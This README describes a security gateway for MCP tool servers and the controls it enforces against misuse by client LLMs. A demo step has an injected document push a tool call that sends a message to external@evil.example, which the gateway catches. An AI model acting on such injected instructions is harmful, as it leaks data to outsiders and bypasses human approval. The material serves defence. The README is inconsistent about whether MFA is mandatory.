# Secure MCP Gateway — working build (no GPU required)

A runnable implementation of the **MCP Gateway control plane** from
`MCP-Secure-Architecture-v10-Final-BuildSpec.md` §4.4. It builds now, on this
machine, with **no GPU**: the gateway runs **no model of its own**. It is a pure
Policy Enforcement Point — each colleague's local LLM connects to the inbound MCP
endpoint (`POST /mcp`) and drives tools through the control pipeline.

Two throwaway reference servers (`servers/docs_server.py`,
`servers/actions_server.py`) exercise the gateway's security fixtures end-to-end.

Two **production MCP servers** ship alongside them (enable in `config.yaml`):

| Server | File | Coverage |
|---|---|---|
| **postgres-mcp** (83 tools) | `servers/postgres_server.py` | Full read/write PostgreSQL: query execution (read-only guarded, writes, atomic transactions, EXPLAIN), complete schema inspection, row CRUD/upsert, DDL (tables/columns/indexes/constraints/views/matviews/sequences/enums/schemas), maintenance (VACUUM/ANALYZE/REINDEX), monitoring (activity, locks, blockers, cache ratios, index usage, replication), roles & GRANT/REVOKE, CSV import/export via COPY. Config: `POSTGRES_URL` (+ `POSTGRES_STATEMENT_TIMEOUT_MS`, `POSTGRES_MAX_ROWS`, `POSTGRES_ALLOW_DANGEROUS`). |
| **gitea-mcp** (116 tools) | `servers/gitea_server.py` | Full Gitea REST v1: repos (CRUD/fork/transfer/topics/stars/watch), branches + protection, tags, commits/diffs/statuses, file contents (read/create/update/delete + batch multi-file commits, auto SHA resolution), issues + comments + labels (name→id resolution) + milestones, pull requests (full flow: create/edit/merge-all-strategies/diff/files/reviews/reviewer-requests), releases, webhooks, deploy keys, collaborators, orgs & teams, notifications. Config: `GITEA_URL`, `GITEA_TOKEN`. |

Both are hardened the same way: env-only credentials (never model-visible),
JSON-string results with structured errors (never raw exceptions), result-size
caps, destructive-op guards (`confirm=true`, `POSTGRES_ALLOW_DANGEROUS`,
required WHERE clauses), and parameterized/identifier-quoted SQL throughout.
`tests/test_mcp_servers.py` drives both against real backends (Docker Postgres
+ Gitea) and skips cleanly when those are absent.

## What it enforces (each maps to the spec + the v7 flaw it closes)

| Control | Where | Spec / flaw |
|---|---|---|
| **Production login — two factors, enforced** — username + strong password (salted **PBKDF2-HMAC-SHA256**, 600k iters) **+ mandatory TOTP authenticator** (RFC 6238; per-user enrolled secret, AES-256-GCM-encrypted at rest under the KEK) → short-lived **ES256** session tokens (RFC 8705-bound); anti-hammering lockout; Tier-3 **step-up** (RFC 9470); identity revocation kill-switch. Bootstrap operators with `scripts/seed_credentials.py`. TPM+PIN X.509 client-cert login is a supported upgrade. | `app/auth.py`, `app/pki.py` | §4.1 / A3 |
| ABAC: role × clearance × classification × tool tier, deny-by-default | `app/authz.py`, `policy.yaml` | §4.1, §5 / B5 |
| Tool risk registry (gateway-owned) + **hash pinning / rug-pull auto-quarantine** | `app/registry.py` | §4.4.3 / B4 |
| **Prompt-injection containment**: taint tracking, tainted args can never auto-execute a write | `app/taint.py`, `app/gateway.py` | §4.5 / B1 |
| Tiered HITL (0 auto → 1 policy → 2 human → 3 two-person) + separation of duties | `app/approvals.py` | §5 / B3 |
| **Unicode/RTL defense** (NFKC, strip bidi/zero-width) | `app/unicode_guard.py` | §4.4.7 / B13 |
| **DLP**: Saudi National ID/Iqama/IBAN detection + checksum + clearance-gated masking | `app/dlp.py` | §4.8 / B8 |
| Tamper-**proof HMAC-SHA256 hash-chained** audit (keyed, not a bare hash) + content minimization (digests, not raw PII) | `app/audit.py` | §4.9 / B10 |
| Kill switch (global/server/tool/user) + rate limiting | `app/controls.py` | §4.4.8 |
| Protocol hardening: schema-shaped args, size limits on args & results | `app/gateway.py` | §4.4.5 / B12 |
| **Inbound MCP endpoint** — each client's own LLM connects via `POST /mcp` (Streamable HTTP); the gateway runs no model | `app/mcp_server.py` | §4.3 / A1 |

## Run it

```bash
cd gateway
pip install fastapi uvicorn "pyjwt[crypto]" cryptography pyyaml pytest httpx mcp

# start (no model — clients drive tools via POST /mcp). On first run the dev PKI
# (CA, ES256 signing key, per-user client certs) is generated under gateway/pki/.
python -m uvicorn app.main:app --host 127.0.0.1 --port 8800
# open http://127.0.0.1:8800/
```

**Login is a production username + strong password.** Operators sign in on the web
console with their username and a strong password; the gateway verifies it against a
salted **PBKDF2-HMAC-SHA256** hash (600k iterations, constant-time compare) and issues
a short-lived **ES256** session token bound to a per-session key (RFC 8705). Five wrong
passwords lock the identity (anti-hammering; self-heals after a short cooldown). **MFA**
is an optional TOTP layer — set `auth.require_mfa: true` to enforce the authenticator
step. The developer login (`/api/dev/*`, the TPM+PIN certificate flow) is **disabled**
in this build (`dev_login_enabled: false`), so stakeholders see only the production sign-in.

**Demo operators:** `sara` (employee) · `khalid` (analyst) · `noura` & `faisal`
(approvers) · `admin` (admin). Password hashes live in `data/credentials.json` — never
plaintext, never in code. The pilot's demo passwords are delivered out-of-band; rotate
them for production with `auth.hash_password()` and overwrite `data/credentials.json`.

### Things to try in the UI
- As **sara**: `search payroll` → Saudi PII comes back **masked** (her clearance < secret).
- As **khalid**: `search payroll` → same data **unmasked** (clearance ≥ secret).
- As **admin**: `read document 4`, then
  `#call actions.send_message {"recipient":"external@evil.example","body":"..."}`
  → the injected recipient is flagged **TAINTED** and routed to **approval**, not executed.
- As **admin**: `#call actions.delete_record {"record_id":"8"}` → **Tier 3**, needs
  two distinct approvers (noura + faisal); admin (the requester) is blocked from approving.
- **Admin tab**: watch the audit chain ("chain intact: N records"), tool registry
  tiers, and the kill switch.

## Test it

```bash
# Offline suites — no server, no Docker (security, auth, hardening, fuzz, DLP,
# approvals lifecycle, files-mcp, the console back-end, and the server-import guard):
python -m pytest tests/ -q --ignore=tests/test_e2e.py --ignore=tests/test_oauth.py \
                          --ignore=tests/test_admin_controls.py

# Live suites — start the gateway on :8800 first, then:
python -m pytest tests/test_e2e.py tests/test_oauth.py tests/test_admin_controls.py -q

# Everything. The postgres/gitea lifecycle tests skip cleanly without their
# mcp-test-pg / mcp-test-gitea docker fixtures.
python -m pytest tests/ -q
```

## Connecting a model (inference is client-side)

The gateway runs **no model** — it is a pure Policy Enforcement Point and MCP
router. Each colleague runs their own local LLM (or a brokered confidential-compute
GPU) as an **MCP client** that connects to the inbound endpoint:

```
POST /mcp        # Streamable HTTP · Authorization: Bearer <session token>
```

The client drives `initialize` → `tools/list` → `tools/call`; every proposed tool
call still passes through authorization, taint, HITL, DLP, and audit exactly as the
table above describes. No GPU is ever attached to the gateway itself.

## Other production swap points (marked in code)
- `app/auth.py` + `app/pki.py` — dev cert auth (local CA, on-disk signing key,
  server-side challenge signing) → Keycloak + AD/LDAP **X.509 CBA**, token-signing
  key in **OpenBao Transit / YubiHSM**, per-user key in the **workstation TPM 2.0**,
  and the cert thumbprint injected by the **mTLS-terminating sidecar**. See
  `../MCP-Authentication-Redesign-Plan.md`.
- `app/mcp_manager.py` — stdio transport → Streamable HTTP + mTLS + SPIFFE.
- `app/audit.py` — local hash-chained JSONL → WORM store + SIEM stream.
- `app/dlp.py` — deterministic detectors → add offline Arabic NER (3-point pipeline).
- Registry `status` — dev auto-activates new tools → production requires Risk-Board approval.

## Completed to 100% software-ready
See `GATEWAY-COMPLETION-PLAN.md` and `OPERATIONS.md`. Beyond the controls table, the
gateway now includes: **persistent** HITL approvals + identity revocation (survive restart);
**working credential vault** with per-call dynamic secrets injected at dispatch (never in model
context/audit); **registry onboarding governance** (Risk-Board approval of new tools);
**three-key rate limiting** (user/tool/server); **circuit breaker** per server; **external-IdP
(Keycloak/OIDC) auth mode**; **startup config validation**; **metrics + SIEM export**; and
**deployment artifacts** (`requirements.txt`, `Dockerfile`, `docker-compose.yml`, CI); **NDMO
classification propagation**; **strict tool-arg schema validation** (`additionalProperties:false`);
parser-fuzz suite; OpenBao vault adapter. **85 tests green.**

## Operator-provided infrastructure (seams ready, not buildable on a dev box)
Production MCP server selection; client-side LLM hosts + brokered confidential-compute GPU; HSM + workstation TPM; a Keycloak host
(`auth.mode: oidc`); TLS 1.3 + mTLS terminator + SPIFFE; SIEM product; DR site; confidential
computing; Arabic NER model. These are later phases in `MCP-Platform-Build-Plan.md`.
